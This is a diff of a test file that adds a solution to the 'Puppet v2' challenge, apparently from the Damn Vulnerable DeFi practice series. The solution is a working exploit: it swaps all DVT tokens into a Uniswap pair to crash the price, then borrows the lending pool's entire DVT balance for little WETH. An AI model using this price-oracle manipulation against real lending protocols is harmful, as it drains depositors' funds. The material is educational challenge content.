@@ -82,7 +82,76 @@ describe('[Challenge] Puppet v2', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+      /** CODE YOUR SOLUTION HERE */
+      // Helper function to get current token/eth balances
+      const logBalances = async (address, name) => {
+        const wethBal = await weth.balanceOf(address);
+        const tokenBal = await token.balanceOf(address);
+
+        console.log(`${name} WETH:`, ethers.utils.formatEther(wethBal));
+        console.log(`${name} DVT:`, ethers.utils.formatEther(tokenBal));
+        console.log("")
+      }
+      const attackPool = lendingPool.connect(player);
+      const attackToken = token.connect(player);
+      const attackWeth = weth.connect(player);
+      const attackUniSwap = uniswapExchange.connect(player);
+
+      console.log("Pre-attack balances")
+      await logBalances(player.address, "player");
+      await logBalances(attackUniSwap.address, "uniswap");
+      
+      // Start with no weth so need to deposit eth to get some
+      const ethBalance = await ethers.provider.getBalance(player.address);
+      console.log("eth balance", ethers.utils.formatEther(ethBalance))
+      await attackWeth.deposit({value: ethers.utils.parseEther("19.7")});
+      await logBalances(player.address, "player"); // Got Weth to work wiht
+
+      await attackWeth.approve(uniswapRouter.address, await attackWeth.balanceOf(player.address));
+      await attackToken.approve(uniswapRouter.address, await attackToken.balanceOf(player.address));
+
+      console.log('wethRequired for full pool', ethers.utils.formatEther(await attackPool.calculateDepositOfWETHRequired(await token.balanceOf(attackPool.address))));
+      const playerDVTBal = await attackToken.balanceOf(player.address);
+      console.log({playerDVTBal, formatted: ethers.utils.formatUnits(playerDVTBal.toString(), 18)})
+      const amountOut = await uniswapRouter.getAmountsOut(playerDVTBal, [attackToken.address, attackWeth.address]);
+      const amountOutMin = amountOut[1];
+      // const val = await attackUniSwap.getAmountOut(playerDVTBal, reservesWeth, reservesDVT);
+      console.log({amountOut, amountOutMin})
+      const tokenIn = attackToken.address;
+      const tokenOut = attackWeth.address;
+      const deadline = Math.floor(Date.now() / 1000) + 60 * 20; // Use the current timestamp + 20 minutes as the deadline for the transaction
+      const path = [tokenIn, tokenOut];
+      const tx = await uniswapRouter.connect(player).swapExactTokensForTokens(
+        playerDVTBal,
+        0,
+        path,
+        player.address,
+        deadline,
+        {
+          gasLimit: 1e7,
+        }
+      );
+
+      console.log({tx})
+      await tx.wait();
+      
+      // We have tossed all our dvt into pool, check where we stand
+      console.log("Pool has been corrupted, check it out")
+      await logBalances(player.address, "player");
+      await logBalances(attackUniSwap.address, "uniswap");
+      const wethRequired = ethers.utils.formatEther(await attackPool.calculateDepositOfWETHRequired(await token.balanceOf(attackPool.address)))
+      console.log('wethRequired for full pool now?', wethRequired);
+      // approve pool before borrow
+      await attackWeth.approve(attackPool.address, await attackWeth.balanceOf(player.address));
+      await attackToken.approve(attackPool.address, await attackToken.balanceOf(player.address));
+
+      await attackPool.borrow(await token.balanceOf(attackPool.address), {
+        gasLimit: 1e7,
+      });
+      console.log("pool hacked?")
+      await logBalances(player.address, "player");
+      await logBalances(attackUniSwap.address, "uniswap");
+      await logBalances(attackPool.address, "pool");
     });
 
     after(async function () {
